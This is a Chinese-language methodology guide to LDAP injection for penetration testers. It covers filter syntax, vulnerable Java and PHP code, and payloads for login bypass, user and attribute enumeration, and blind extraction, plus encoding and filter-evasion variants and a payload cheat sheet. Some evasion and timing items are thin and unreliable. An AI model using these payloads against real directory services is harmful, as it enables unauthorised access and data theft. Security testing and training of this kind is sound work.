# LDAP 注入攻击方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供 LDAP 注入漏洞的标准化测试与利用流程，帮助识别和利用 LDAP 查询中的注入漏洞，绕过认证、提取目录信息或修改 LDAP 数据。

## 1.2 适用范围
适用于使用 LDAP（轻量级目录访问协议）进行用户认证、目录查询的企业应用、单点登录系统（SSO）、邮件系统等。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师，以及负责代码审计的开发人员。

---

# 第二部分：核心渗透技术专题

## 专题：LDAP 注入攻击

### 2.1 技术介绍

LDAP 注入是指攻击者通过构造包含 LDAP 元字符的输入，操纵 LDAP 查询逻辑的攻击方式。当应用程序将用户输入直接拼接到 LDAP 查询语句中而未进行适当过滤时，就会发生 LDAP 注入。

**LDAP 查询语法示例：**
```
# 正常查询
(&(username=john)(password=secret123))

# 注入后查询
(&(username=john)(password=secret123))(|(cn=*))
```

**常见 LDAP 元字符：**
| 字符 | 含义 |
|-----|------|
| `(` | 开始过滤器 |
| `)` | 结束过滤器 |
| `&` | AND 操作符 |
| `\|` | OR 操作符 |
| `!` | NOT 操作符 |
| `*` | 通配符 |

### 2.2 攻击常见业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **用户认证** | 企业登录、SSO 单点登录 | 用户名/密码直接拼接到 LDAP 查询 |
| **目录搜索** | 用户搜索、联系人查询 | 搜索关键词未过滤 LDAP 元字符 |
| **邮件系统** | 邮箱地址查询、通讯录 | 邮件客户端 LDAP 查询 |
| **VPN 认证** | 远程访问认证 | VPN 网关使用 LDAP 验证用户 |
| **文件共享** | NAS 认证、权限查询 | 文件服务器 LDAP 集成 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**输入点识别：**
- 登录表单的用户名/密码字段
- 搜索框
- 任何与目录查询相关的参数

**初步探测 Payload：**

```
# 基础测试 - 添加 OR 条件
username=*)(uid=*))(|(uid=*
password=anything

# 通配符测试
username=admin*
password=*

# 特殊字符测试
username=)(&(password=*))
password=test

# 盲注测试
username=*)(uid=admin*))(|(uid=*
```

**响应判断：**
- 认证被绕过（登录成功）
- 返回多个用户结果
- 出现 LDAP 错误信息（如 `LDAP: error code 32`）
- 响应时间变化

#### 2.3.2 白盒测试

**代码审计关键词（Java）：**
```java
// 危险代码示例
String query = "(&(username=" + userInput + ")(password=" + pass + "))";
DirContext ctx = ldapContext.search(baseDN, query, null);

// 敏感类/方法
- javax.naming.directory.DirContext.search()
- InitialDirContext.authenticate()
- LdapTemplate.authenticate()
```

**代码审计关键词（PHP）：**
```php
// 危险代码
ldap_search($conn, $baseDn, "(&(uid=$user)(password=$pass))");
```

### 2.4 漏洞利用方法

#### 2.4.1 认证绕过

```
# 基本认证绕过
username=*)(uid=*))(|(uid=*
password=anything

# 或
username=admin*
password=*

# 或（更隐蔽）
username=*)(objectClass=*)
password=*)(objectClass=*)
```

#### 2.4.2 信息收集

```
# 枚举有效用户名
username=*)(uid=admin*
# 如果 admin 存在，查询可能返回结果

# 获取所有用户
*)(uid=*))(|(uid=*

# 探测属性名
username=*)(cn=*))(|(uid=*
username=*)(mail=*))(|(uid=*
```

#### 2.4.3 盲注提取

通过条件响应逐字符提取信息：

```
# 测试用户名首字母
username=*)(uid=a*))(|(uid=*
# 如果返回成功，说明有用户以 'a' 开头

# 逐字符提取
username=*)(uid=ad*))(|(uid=*
username=*)(uid=adm*))(|(uid=*
username=*)(uid=admin*))(|(uid=*
```

#### 2.4.4 属性枚举

```
# 探测常见 LDAP 属性
*)(objectClass=*))(|(uid=*          # objectClass
*)(cn=*))(|(uid=*                   # commonName
*)(mail=*))(|(uid=*                 # mail
*)(telephoneNumber=*))(|(uid=*      # telephoneNumber
*)(description=*))(|(uid=*          # description
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过输入验证

```
# URL 编码绕过
%2a%29%28uid%3d%2a%29%29%28%7c%28uid%3d%2a

# Unicode 编码
\u002a\u0029\u0028uid\u003d\u002a

# 双 URL 编码
%252a%2529%2528
```

#### 2.5.2 绕过过滤器

```
# 如果过滤了 )(
username=*) (uid=*) ) (| (uid=*

# 如果过滤了空格
username=*)(uid=*))(|(uid=*

# 使用换行符
username=*)
(uid=*))(|(uid=*
```

#### 2.5.3 时间盲注

当无法直接看到响应差异时：

```
# 利用 LDAP 查询延迟
username=*)(uid=admin*)(|(uid=*
# 观察响应时间判断是否存在该用户
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | Payload | 说明 |
|-----|---------|------|
| **认证绕过** | `*)(uid=*))(|(uid=*` | 经典 OR 注入 |
| **认证绕过** | `admin*` / `*` | 通配符绕过 |
| **认证绕过** | `*)(objectClass=*)` | 匹配所有对象 |
| **信息收集** | `*)(uid=admin*` | 枚举用户名 |
| **信息收集** | `*)(cn=*` | 探测 commonName |
| **信息收集** | `*)(mail=*` | 探测邮箱字段 |
| **盲注** | `*)(uid=a*))(|(uid=*` | 逐字符爆破 |

## 3.2 常见 LDAP 属性

| 属性 | 缩写 | 说明 |
|-----|------|------|
| `uid` | - | 用户 ID |
| `cn` | Common Name | 通用名称 |
| `sn` | Surname | 姓氏 |
| `mail` | - | 邮箱地址 |
| `ou` | Organizational Unit | 组织单位 |
| `dc` | Domain Component | 域组件 |
| `objectClass` | - | 对象类 |
| `distinguishedName` | DN | 专有名称 |
| `memberOf` | - | 所属组 |
| `telephoneNumber` | - | 电话号码 |

## 3.3 LDAP 默认端口

| 服务 | 端口 | 说明 |
|-----|------|------|
| LDAP | 389 | 标准 LDAP |
| LDAPS | 636 | LDAP over SSL |
| Global Catalog | 3268 | AD 全局编目 |
| Global Catalog SSL | 3269 | GC over SSL |

## 3.4 参考资源

- [OWASP LDAP Injection](https://owasp.org/www-community/attacks/LDAP_injection)
- [PortSwigger - LDAP Injection](https://portswigger.net/web-security/ldap-injection)
- [Microsoft AD Security](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/)
